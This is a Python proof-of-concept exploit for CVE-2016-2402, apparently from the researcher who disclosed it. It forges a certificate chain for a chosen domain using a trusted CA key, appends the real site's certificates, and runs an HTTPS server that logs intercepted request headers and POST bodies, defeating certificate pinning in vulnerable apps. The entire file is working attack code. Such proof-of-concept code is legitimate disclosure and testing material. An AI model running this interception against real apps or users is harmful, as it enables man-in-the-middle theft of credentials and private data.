#!/usr/bin/python3
# John Kozyrakis

import tempfile
from http.server import BaseHTTPRequestHandler, HTTPServer
import ssl
import argparse
import logging
import os
import sys
from OpenSSL import crypto, SSL
import socket

class ServerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logging.debug("intercepted GET request. If you see data from the client here, the attack worked.")
        self.log_request()
        logging.debug(self.headers)

    def do_POST(self):
        logging.debug("")
        logging.debug(
            "intercepted POST request to %s. If you see data from the client here, the attack worked." % self.path)
        self.log_request()
        if "tracking" not in self.path:
            logging.debug(self.headers)
            length = int(self.headers['Content-Length'])
            content = self.rfile.read(length)
            logging.debug(content)


def gen_malicious_chain(domain):
    # load CA certificate and key
    trusted_ca_cert = crypto.load_certificate(crypto.FILETYPE_PEM,
                                              open(os.path.join(os.path.dirname(__file__), CA_CERT)).read())
    trusted_ca_key = crypto.load_privatekey(crypto.FILETYPE_PEM,
                                            open(os.path.join(os.path.dirname(__file__), CA_KEY)).read())

    # generate a new end-entity certificate for a given domain signed by our trusted CA
    [(end_entity_cert, end_entity_key)] = generate_end_entity_cert(domain, trusted_ca_cert, trusted_ca_key)
    tempMaliciousChainFile.write(crypto.dump_certificate(crypto.FILETYPE_PEM, end_entity_cert))
    tempMaliciousChainFile.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, end_entity_key))

    logging.debug("Generated end-entity cert & key, signed by the provided CA. Adding these to the malicious chain")

    upstream_certs = get_upstream_certs(domain, 443)

    logging.info("Retrieved the certificates used by the real %s (%s in total)" % (domain, len(upstream_certs)))

    if args.mode == 'attack':
        for cert in upstream_certs:
            tempMaliciousChainFile.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        logging.info("The upstream certificates WILL be added to the malicious client chain")
    else:
        logging.info("The upstream certificates will NOT be added to the malicious client chain")


def generate_end_entity_cert(domain, cacert, cakey):
    skey = crypto.PKey()
    skey.generate_key(crypto.TYPE_RSA, 2048)
    scert = crypto.X509()
    scert.get_subject().CN = domain  # This is where the domain fits
    scert.set_issuer(cacert.get_subject())
    scert.gmtime_adj_notBefore(0)
    scert.gmtime_adj_notAfter(365 * 24 * 60 * 60)
    scert.set_serial_number(0)
    scert.set_pubkey(skey)
    scert.sign(cakey, "sha1")
    return [(scert, skey)]


def get_upstream_certs(host, port):
    context = SSL.Context(SSL.SSLv23_METHOD)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection = SSL.Connection(context, s)
    connection.connect((host, port))
    try:
        connection.do_handshake()
    except SSL.WantReadError:
        logging.error("Timeout")
        cleanup()
    return connection.get_peer_cert_chain()


def cleanup():
    tempMaliciousChainFile.close()
    logging.error("Exiting")
    sys.exit(1)


logging.basicConfig(level=logging.DEBUG)
logging.info("Certificate Pinning bypass POC - CVE-2016-2402 - https://koz.io/pinning-cve-2016-2402")

parser = argparse.ArgumentParser(
    prog='Certificate Pinning bypass POC',
    description='''This utility will set up a HTTPS server that uses a malicious certificate chain for a specific domain.
     If traffic of a vulnerable app is redirected to this server, certificate pinning for that domain will bypassed.
     See https://koz.io/pinning-cve-2016-2402 for more details.''',
    epilog='''@ikoz - John Kozyrakis''')

parser.add_argument("-d", "--domain", help="Domain name to be intercepted", required=True)
parser.add_argument("-p", "--port", help="Web server port number", type=int, default=443)
parser.add_argument("-c", "--cacert", help="CA certificate that the host system trusts (PEM)", default="CA_CERT.pem")
parser.add_argument("-k", "--cakey", help="Private key of CA that the host system trusts (PEM)", default="CA_KEY.pem")
parser.add_argument("-m", "--mode", help="Add upstream certificates to chain (or not)",
                    choices=['attack', 'no-attack'], required=True)
parser.add_argument("-v", "--verbose", help="increase output verbosity",
                    action="store_true")
args = parser.parse_args()

logging.info("Will intercept domain %s" % args.domain)
logging.info("Will use CA certificate %s with private key %s" % (args.cacert, args.cakey))

CA_CERT = args.cacert  # certificate of CA that the host system trusts
CA_KEY = args.cakey  # private key of CA that the host system trusts

if os.path.isfile(CA_CERT) is False:
    logging.error("CA_CERT %s is not a valid file" % CA_CERT)
    cleanup()
if os.path.isfile(CA_KEY) is False:
    logging.error("CA_KEY %s is not a valid file" % CA_KEY)
    cleanup()

tempMaliciousChainFile = tempfile.NamedTemporaryFile()

gen_malicious_chain(args.domain)

logging.info(
    "Starting web server - listening at port %s. Redirecting traffic for %s to this server will bypass any pinning and "
    "show the requests here" % (
        args.port, args.domain))
logging.info("Use Ctrl+C to stop the server")

try:
    httpd = HTTPServer(("localhost", args.port), ServerHandler)
except PermissionError:
    logging.error("PermissionError: Cannot start server on port %s. Please use sudo or a port >1024" % args.port)
    cleanup()
except:
    logging.exception("Exception")
    cleanup()

httpd.socket = ssl.wrap_socket(httpd.socket, certfile=tempMaliciousChainFile.name, server_side=True)
httpd.serve_forever()
